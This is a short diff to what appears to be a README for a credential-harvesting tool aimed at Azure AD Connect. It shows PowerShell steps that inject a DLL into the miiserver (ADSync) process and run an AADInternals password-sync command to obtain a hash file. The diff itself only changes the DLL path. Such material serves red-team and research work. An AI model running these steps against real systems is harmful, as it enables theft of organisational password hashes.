@@ -18,7 +18,7 @@ Start-Service ADSync
 ```powershell
 Get-Process miiserver
 
-.\Injector.exe --process-id <pid> --inject C:\PHS-Hooking\LoadCLR.dll
+.\Injector.exe --process-id <pid> --inject C:\Temp\LoadCLR.dll
 ```
 <br/>
 
@@ -38,3 +38,4 @@ Import-Module -Name AADInternals -RequiredVersion 0.9.3
 Initialize-AADIntFullPasswordSync
 ```
 *it may takes a few seconds to get the hash file*
+
